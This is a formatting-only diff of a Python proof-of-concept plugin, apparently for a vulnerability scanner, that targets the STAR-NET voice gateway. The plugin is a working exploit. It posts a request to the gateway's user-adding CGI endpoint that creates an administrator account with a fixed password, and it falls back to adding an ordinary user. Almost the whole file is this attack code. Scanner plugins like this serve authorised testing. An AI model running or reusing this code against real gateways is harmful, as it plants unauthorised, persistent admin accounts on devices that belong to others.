@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 import random
 
+
 class Vuln(ABVuln):
-    vuln_id = 'STAR-NET_0002' # 平台漏洞编号，留空
+    vuln_id = 'STAR-NET_0002'  # 平台漏洞编号，留空
     name = '星网锐捷语音网关 任意添加管理员'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         星网锐捷语音网关（STAR-NET）任意添加管理员。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '星网锐捷语音网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '2732f1d6-44e3-4875-bb6c-e7735f2505cb'
@@ -33,24 +35,28 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             arg = self.target
-            #任意添加管理员
+            # 任意添加管理员
             username = 'test_vul_' + str(random.randint(1111, 9999))
-            post = 'plus_type=1&plus_username={username}&plus_password=admin1234&plus_confirm=admin1234&btn_addplus=Add'.format(username=username)
+            post = 'plus_type=1&plus_username={username}&plus_password=admin1234&plus_confirm=admin1234&btn_addplus=Add'.format(
+                username=username)
             content_type = 'Content-Type: application/x-www-form-urlencoded'
             url = arg + '/cgi-bin/Form_AddPlusUser'
             #proxy = ('127.0.0.1', 8887)
-            code, head, res, err, _ = hh.http(url, header=content_type, post=post)
+            code, head, res, err, _ = hh.http(
+                url, header=content_type, post=post)
             #print code, head, res
-            #flag=23/24表示添加管理员成功
+            # flag=23/24表示添加管理员成功
             if (code == 200 or code == 302) and ('password.asp?flag=23' in res or 'password.asp?flag=24' in res):
-                security_hole('任意添加管理员:' + url + ' POST:' +post)
+                security_hole('任意添加管理员:' + url + ' POST:' + post)
             else:
-                #添加管理员账户不成功，尝试添加普通账户（管理员账户最多有4个）
-                post = 'plus_type=0&plus_username={username}&plus_password=admin1234&plus_confirm=admin1234&btn_addplus=Add'.format(username=username)
-                code, head, res, err, _ = hh.http(url, header=content_type, post=post)
+                # 添加管理员账户不成功，尝试添加普通账户（管理员账户最多有4个）
+                post = 'plus_type=0&plus_username={username}&plus_password=admin1234&plus_confirm=admin1234&btn_addplus=Add'.format(
+                    username=username)
+                code, head, res, err, _ = hh.http(
+                    url, header=content_type, post=post)
                 if (code == 200 or code == 302) and ('password.asp?flag=23' in res or 'password.asp?flag=24' in res):
                     #security_hole('任意添加用户:' + url + ' POST:' +post)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -61,6 +67,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
